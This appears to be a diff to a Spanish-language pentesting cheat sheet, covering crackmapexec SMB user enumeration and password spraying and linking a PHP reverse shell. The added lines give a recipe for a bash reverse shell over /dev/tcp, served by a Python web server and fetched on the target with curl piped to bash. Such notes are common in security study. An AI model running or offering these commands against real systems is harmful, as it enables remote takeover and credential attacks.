@@ -275,9 +275,13 @@ crackmapexec smb [IP] -u '' -p '' --user --> enumerar usuarios
 crackmapexec smb [IP] -u [user] -p [passwords] -- probar usarios y contraseñas
 smbmap 
 
---------------------- Reverse Shell PHP
+--------------------- Reverse Shell
 
 https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+ 
+1- Creamos un script .sh con bash -i >& /dev/tcp/IP/PUERTO 0>&1
+2- Compartimos ese archivo mediante python -m....
+3- Lo ejecutamos /usr/bin/curl IP/ARCHIVO|bash
 
 --------------------- Upload file bypass
 
